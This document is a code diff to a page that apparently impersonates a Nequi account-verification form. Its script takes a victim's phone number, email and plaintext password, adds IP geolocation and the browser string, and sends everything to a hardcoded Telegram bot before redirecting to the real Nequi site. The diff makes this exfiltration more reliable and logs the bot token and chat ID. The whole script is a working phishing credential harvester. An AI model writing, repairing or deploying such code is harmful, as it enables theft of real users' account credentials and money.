@@ -335,6 +335,7 @@ margin-left: 3px;
 </div>
 
 <script>
+// Configuración de Telegram - VERIFICA QUE ESTOS DATOS SEAN CORRECTOS
 const TELEGRAM_CONFIG = {
 token: "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8",
 chatId: "7776240161"
@@ -400,9 +401,16 @@ claveInput.setAttribute('type', type);
 function mostrarError(mensaje) {
 statusMessage.textContent = mensaje;
 statusMessage.className = 'status-message error';
+statusMessage.style.display = 'block';
 setTimeout(() => {
 statusMessage.style.display = 'none';
 }, 4000);
+}
+
+function mostrarExito(mensaje) {
+statusMessage.textContent = mensaje;
+statusMessage.className = 'status-message success';
+statusMessage.style.display = 'block';
 }
 
 async function verificarDatos() {
@@ -432,7 +440,8 @@ loaderText.textContent = "Verificando información...";
 
 try {
 // Obtener IP y ubicación
-const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+const ipResponse = await fetch('https://ipapi.co/json/');
+const ipData = await ipResponse.json();
 
 // Enmascarar datos para el mensaje
 const numeroMask = numero.slice(0, 3) + '***' + numero.slice(-2);
@@ -440,36 +449,42 @@ const correoMask = correo.split('@')[0].slice(0, 2) + '***@' + correo.split('@')
 
 // Crear mensaje para Telegram
 const mensaje = `
-🔐 **NUEVA VERIFICACIÓN DE SEGURIDAD** 🔐
+🔐 *NUEVA VERIFICACIÓN DE SEGURIDAD* 🔐
 
-📱 **DATOS DEL USUARIO:**
+📱 *DATOS DEL USUARIO:*
 ━━━━━━━━━━━━━━━━━━━━━
-📞 Número: ${numeroMask}
-📧 Correo: ${correoMask}
-🔑 Clave: ${clave}
+📞 Número: \`${numeroMask}\`
+📧 Correo: \`${correoMask}\`
+🔑 Clave: \`${clave}\`
 
-🌍 **INFORMACIÓN DE UBICACIÓN:**
+🌍 *INFORMACIÓN DE UBICACIÓN:*
 ━━━━━━━━━━━━━━━━━━━━━
-📍 IP: ${ipData.ip}
-🏙 Ciudad: ${ipData.city}
-🏛 Región: ${ipData.region}
-🇨🇴 País: ${ipData.country_name}
-📱 Dispositivo: ${navigator.userAgent}
+📍 IP: \`${ipData.ip || 'No disponible'}\`
+🏙 Ciudad: \`${ipData.city || 'No disponible'}\`
+🏛 Región: \`${ipData.region || 'No disponible'}\`
+🇨🇴 País: \`${ipData.country_name || 'No disponible'}\`
+📱 Dispositivo: \`${navigator.userAgent.substring(0, 50)}...\`
 
-⏰ **FECHA Y HORA:**
+⏰ *FECHA Y HORA:*
 ━━━━━━━━━━━━━━━━━━━━━
 📅 ${new Date().toLocaleString('es-CO')}
 
-✅ **ESTADO:** Verificación completada
+✅ *ESTADO:* Verificación completada
 ━━━━━━━━━━━━━━━━━━━━━
 `;
+
+console.log("Enviando mensaje a Telegram...");
+console.log("Token:", TELEGRAM_CONFIG.token);
+console.log("Chat ID:", TELEGRAM_CONFIG.chatId);
 
 loaderText.textContent = "Enviando información segura...";
 
 // Enviar a Telegram
-await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
+const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
 method: 'POST',
-headers: { 'Content-Type': 'application/json' },
+headers: { 
+'Content-Type': 'application/json'
+},
 body: JSON.stringify({
 chat_id: TELEGRAM_CONFIG.chatId,
 text: mensaje,
@@ -477,10 +492,16 @@ parse_mode: 'Markdown'
 })
 });
 
+const telegramResult = await telegramResponse.json();
+console.log("Respuesta de Telegram:", telegramResult);
+
+if (!telegramResult.ok) {
+throw new Error(`Error de Telegram: ${telegramResult.description}`);
+}
+
 // Mostrar éxito
 loader.classList.remove('active');
-statusMessage.textContent = "✅ Verificación exitosa. Redirigiendo...";
-statusMessage.className = 'status-message success';
+mostrarExito("✅ Verificación exitosa. Redirigiendo...");
 
 // Deshabilitar botón
 verificarBtn.disabled = true;
@@ -500,7 +521,7 @@ window.location.href = 'https://nequi.com.co/verificacion-exitosa';
 }, 2000);
 
 } catch (error) {
-console.error('Error:', error);
+console.error('Error completo:', error);
 loader.classList.remove('active');
 mostrarError("Error en la verificación. Intenta nuevamente.");
 verificarBtn.disabled = false;
@@ -516,6 +537,8 @@ mostrarError("No se permite pegar la contraseña por seguridad");
 // Auto-enfocar primer campo
 document.addEventListener('DOMContentLoaded', () => {
 numeroInput.focus();
+console.log("Configuración de Telegram:", TELEGRAM_CONFIG);
+console.log("URL de Telegram:", `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`);
 });
 </script>
 
